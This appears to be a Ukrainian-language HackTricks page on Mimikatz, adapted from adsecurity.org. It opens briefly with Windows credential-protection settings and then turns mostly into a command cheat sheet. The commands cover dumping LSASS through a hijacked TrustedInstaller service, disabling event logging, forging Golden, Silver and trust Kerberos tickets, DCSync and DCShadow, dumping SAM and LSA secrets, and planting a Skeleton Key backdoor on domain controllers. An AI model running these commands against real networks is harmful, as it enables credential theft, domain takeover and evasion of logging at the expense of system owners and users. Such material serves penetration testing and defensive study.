# Mimikatz

{{#include ../../banners/hacktricks-training.md}}

**Ця сторінка базується на одній з [adsecurity.org](https://adsecurity.org/?page_id=1821)**. Перевірте оригінал для отримання додаткової інформації!

## LM та відкритий текст в пам'яті

Починаючи з Windows 8.1 та Windows Server 2012 R2, були впроваджені значні заходи для захисту від крадіжки облікових даних:

- **LM хеші та паролі у відкритому тексті** більше не зберігаються в пам'яті для підвищення безпеки. Специфічна настройка реєстру, _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_, повинна бути налаштована з значенням DWORD `0`, щоб вимкнути Digest Authentication, забезпечуючи, що паролі у "відкритому тексті" не кешуються в LSASS.

- **Захист LSA** введено для захисту процесу Local Security Authority (LSA) від несанкціонованого читання пам'яті та ін'єкції коду. Це досягається шляхом позначення LSASS як захищеного процесу. Активація захисту LSA передбачає:
1. Модифікацію реєстру в _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_, встановивши `RunAsPPL` на `dword:00000001`.
2. Впровадження об'єкта групової політики (GPO), який забезпечує цю зміну реєстру на керованих пристроях.

Незважаючи на ці заходи, такі інструменти, як Mimikatz, можуть обійти захист LSA, використовуючи специфічні драйвери, хоча такі дії, ймовірно, будуть зафіксовані в журналах подій.

### Протидія видаленню SeDebugPrivilege

Зазвичай адміністратори мають SeDebugPrivilege, що дозволяє їм налагоджувати програми. Цю привілегію можна обмежити, щоб запобігти несанкціонованим дампам пам'яті, що є поширеною технікою, яку використовують зловмисники для витягування облікових даних з пам'яті. Однак, навіть з видаленою цією привілегією, обліковий запис TrustedInstaller все ще може виконувати дампи пам'яті, використовуючи налаштовану конфігурацію служби:
```bash
sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
sc start TrustedInstaller
```
Це дозволяє скинути пам'ять `lsass.exe` у файл, який потім можна проаналізувати на іншій системі для витягнення облікових даних:
```
# privilege::debug
# sekurlsa::minidump lsass.dmp
# sekurlsa::logonpasswords
```
## Mimikatz Options

Зловмисне втручання в журнали подій у Mimikatz включає дві основні дії: очищення журналів подій та патчинг служби подій, щоб запобігти реєстрації нових подій. Нижче наведені команди для виконання цих дій:

#### Clearing Event Logs

- **Command**: Ця дія спрямована на видалення журналів подій, ускладнюючи відстеження зловмисних дій.
- Mimikatz не надає прямої команди в своїй стандартній документації для очищення журналів подій безпосередньо через командний рядок. Однак маніпуляції з журналами подій зазвичай включають використання системних інструментів або скриптів поза Mimikatz для очищення конкретних журналів (наприклад, використовуючи PowerShell або Windows Event Viewer).

#### Experimental Feature: Patching the Event Service

- **Command**: `event::drop`
- Ця експериментальна команда призначена для зміни поведінки служби реєстрації подій, ефективно запобігаючи їй реєструвати нові події.
- Example: `mimikatz "privilege::debug" "event::drop" exit`

- Команда `privilege::debug` забезпечує, щоб Mimikatz працював з необхідними привілеями для зміни системних служб.
- Команда `event::drop` потім патчить службу реєстрації подій.

### Kerberos Ticket Attacks

### Golden Ticket Creation

Золотий квиток дозволяє здійснювати імперсонацію з доступом на рівні домену. Ключова команда та параметри:

- Command: `kerberos::golden`
- Parameters:
- `/domain`: Ім'я домену.
- `/sid`: Ідентифікатор безпеки (SID) домену.
- `/user`: Ім'я користувача для імперсонації.
- `/krbtgt`: NTLM хеш облікового запису служби KDC домену.
- `/ptt`: Безпосередньо інжектує квиток в пам'ять.
- `/ticket`: Зберігає квиток для подальшого використання.

Example:
```bash
mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash /ptt" exit
```
### Створення Срібного Квитка

Срібні Квитки надають доступ до конкретних сервісів. Основна команда та параметри:

- Команда: Схожа на Золотий Квиток, але націлена на конкретні сервіси.
- Параметри:
- `/service`: Сервіс, на який націлюються (наприклад, cifs, http).
- Інші параметри схожі на Золотий Квиток.

Приклад:
```bash
mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /target:service.example.com /service:cifs /rc4:ntlmhash /ptt" exit
```
### Створення квитків довіри

Квитки довіри використовуються для доступу до ресурсів між доменами, використовуючи відносини довіри. Ключова команда та параметри:

- Команда: Схожа на Золотий Квиток, але для відносин довіри.
- Параметри:
- `/target`: Повне доменне ім'я цільового домену.
- `/rc4`: NTLM хеш для облікового запису довіри.

Приклад:
```bash
mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123456789-123456789 /sids:S-1-5-21-987654321-987654321-987654321-519 /rc4:ntlmhash /user:admin /service:krbtgt /target:parent.example.com /ptt" exit
```
### Додаткові команди Kerberos

- **Список квитків**:

- Команда: `kerberos::list`
- Перераховує всі квитки Kerberos для поточної сесії користувача.

- **Передати кеш**:

- Команда: `kerberos::ptc`
- Впроваджує квитки Kerberos з файлів кешу.
- Приклад: `mimikatz "kerberos::ptc /ticket:ticket.kirbi" exit`

- **Передати квиток**:

- Команда: `kerberos::ptt`
- Дозволяє використовувати квиток Kerberos в іншій сесії.
- Приклад: `mimikatz "kerberos::ptt /ticket:ticket.kirbi" exit`

- **Очищення квитків**:
- Команда: `kerberos::purge`
- Очищає всі квитки Kerberos з сесії.
- Корисно перед використанням команд маніпуляції квитками, щоб уникнути конфліктів.

### Підробка Active Directory

- **DCShadow**: Тимчасово змусити машину діяти як DC для маніпуляцій з об'єктами AD.

- `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`

- **DCSync**: Імітувати DC для запиту даних паролів.
- `mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit`

### Доступ до облікових даних

- **LSADUMP::LSA**: Витягти облікові дані з LSA.

- `mimikatz "lsadump::lsa /inject" exit`

- **LSADUMP::NetSync**: Імітувати DC, використовуючи дані паролів облікового запису комп'ютера.

- _У оригінальному контексті не надано конкретної команди для NetSync._

- **LSADUMP::SAM**: Доступ до локальної бази даних SAM.

- `mimikatz "lsadump::sam" exit`

- **LSADUMP::Secrets**: Розшифрувати секрети, збережені в реєстрі.

- `mimikatz "lsadump::secrets" exit`

- **LSADUMP::SetNTLM**: Встановити новий NTLM хеш для користувача.

- `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`

- **LSADUMP::Trust**: Отримати інформацію про аутентифікацію довіри.
- `mimikatz "lsadump::trust" exit`

### Різне

- **MISC::Skeleton**: Впровадити бекдор в LSASS на DC.
- `mimikatz "privilege::debug" "misc::skeleton" exit`

### Підвищення привілеїв

- **PRIVILEGE::Backup**: Отримати права на резервне копіювання.

- `mimikatz "privilege::backup" exit`

- **PRIVILEGE::Debug**: Отримати привілеї налагодження.
- `mimikatz "privilege::debug" exit`

### Витягування облікових даних

- **SEKURLSA::LogonPasswords**: Показати облікові дані для користувачів, які увійшли в систему.

- `mimikatz "sekurlsa::logonpasswords" exit`

- **SEKURLSA::Tickets**: Витягти квитки Kerberos з пам'яті.
- `mimikatz "sekurlsa::tickets /export" exit`

### Маніпуляція SID та токенами

- **SID::add/modify**: Змінити SID та SIDHistory.

- Додати: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
- Змінити: _У оригінальному контексті не надано конкретної команди для зміни._

- **TOKEN::Elevate**: Імітувати токени.
- `mimikatz "token::elevate /domainadmin" exit`

### Служби терміналів

- **TS::MultiRDP**: Дозволити кілька RDP сесій.

- `mimikatz "ts::multirdp" exit`

- **TS::Sessions**: Перерахувати сесії TS/RDP.
- _У оригінальному контексті не надано конкретної команди для TS::Sessions._

### Сховище

- Витягти паролі з Windows Vault.
- `mimikatz "vault::cred /patch" exit`


{{#include ../../banners/hacktricks-training.md}}
